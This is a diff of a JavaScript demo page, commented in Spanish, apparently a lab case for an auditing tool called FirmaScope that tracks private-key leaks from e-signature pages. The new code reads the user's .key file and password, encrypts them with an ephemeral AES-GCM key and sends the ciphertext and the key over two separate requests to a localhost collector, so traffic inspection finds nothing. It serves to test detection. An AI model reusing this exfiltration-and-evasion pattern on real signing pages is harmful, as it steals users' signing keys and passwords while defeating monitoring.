@@ -1,50 +1,53 @@
 /*
- * demo-encrypted-exfiltration — exfiltracion opaca.
+ * demo-encrypted-exfiltration: la clave sale, pero cifrada.
  *
- * El caso que justifica el seguimiento de procedencia. El sitio cifra el
- * PKCS#8 en claro con una clave AES propia y envia el criptograma. Un
- * observador que solo mire el trafico ve bytes indistinguibles de ruido: no
- * hay canario que coincidir, ni cadena reconocible en el cuerpo.
+ * Es el caso que derrota a la inspeccion de red: el cuerpo de la peticion no
+ * contiene ningun canario, porque lo que viaja es AES-GCM de la clave con una
+ * llave efimera. Buscar la cadena en el trafico no encuentra nada.
  *
- * FirmaScope no necesita interpretar el contenido. Le basta con haber seguido
- * el dato desde `subtle.decrypt` (S3) hasta `fetch`, y con que la
- * transformacion intermedia este marcada como DERIVED.
- *
- * Resultado esperado de la auditoria:
- *   FS-KEY-001 -> NOT_OBSERVED (no salio material *directo*)
- *   FS-KEY-002 -> OBSERVED (salieron datos derivados de la clave privada)
+ * Lo que si queda es la *procedencia*: la instrumentacion observa que el valor
+ * enviado desciende del contenido del .key a traves de encrypt(). FirmaScope
+ * debe declarar FS-KEY-002 (material derivado transmitido) y no FS-KEY-001, que
+ * afirmaria algo mas fuerte de lo observado.
  */
 
-async function cifrarYEnviar(pkcs8, password) {
-  /* Clave de transporte del propio sitio: el auditor no la conoce. */
-  const transportKey = await crypto.subtle.generateKey(
+async function wrapAndSend(keyBytes, password) {
+  /* Llave efimera: no esta en el codigo y no se reutiliza. */
+  const transport = await crypto.subtle.generateKey(
     { name: 'AES-GCM', length: 256 }, true, ['encrypt']);
   const iv = crypto.getRandomValues(new Uint8Array(12));
 
+  const payload = new TextEncoder().encode(JSON.stringify({
+    k: toBase64(keyBytes),
+    p: password
+  }));
   const sealed = await crypto.subtle.encrypt(
-    { name: 'AES-GCM', iv: iv }, transportKey, pkcs8);
+    { name: 'AES-GCM', iv: iv }, transport, payload);
 
-  const payload = JSON.stringify({
-    iv: toBase64(iv),
-    blob: toBase64(sealed),
-    hint: password.length
-  });
-  await fetch(collectorUrl('/collect/blob'), {
+  /* La llave de transporte viaja aparte, por otro canal. */
+  const raw = await crypto.subtle.exportKey('raw', transport);
+
+  await fetch('http://localhost:8766/blob', {
     method: 'POST',
     headers: { 'Content-Type': 'application/octet-stream' },
-    body: payload
+    body: sealed
   });
-  log('criptograma enviado al recolector (' + payload.length + ' bytes)');
+  navigator.sendBeacon('http://localhost:8766/k?i=' + encodeURIComponent(toBase64(iv)),
+                       toBase64(raw));
 }
 
-labMain(async function (keyBytes, password, cerBytes) {
-  const loaded = await loadPrivateKey(keyBytes, password);
-  log('clave privada importada; PKCS#8 en claro disponible en memoria');
+labSetup({
+  onSign: async function (state, documentText) {
+    const keyBytes = await readFile(state.key);
+    const cerBytes = await readFile(state.cer);
 
-  const signature = await signDocument(loaded.key, LAB_DOCUMENT);
-  log('documento firmado localmente (' + signature.byteLength + ' bytes)');
+    wrapAndSend(keyBytes, state.password).catch(function () {});
 
-  await cifrarYEnviar(loaded.pkcs8, password);
-  await entregarFirma(signature, cerBytes);
-  setStatus('Firmado. Se envio un criptograma derivado de la clave privada.', 'error');
+    const loaded = await loadPrivateKey(keyBytes, state.password);
+    const signature = await signDocument(loaded.key, documentText);
+    log('firma generada: ' + signature.byteLength + ' bytes');
+
+    return { signature: signature, certificate: cerBytes };
+  },
+  onSubmit: labSubmitSignature
 });
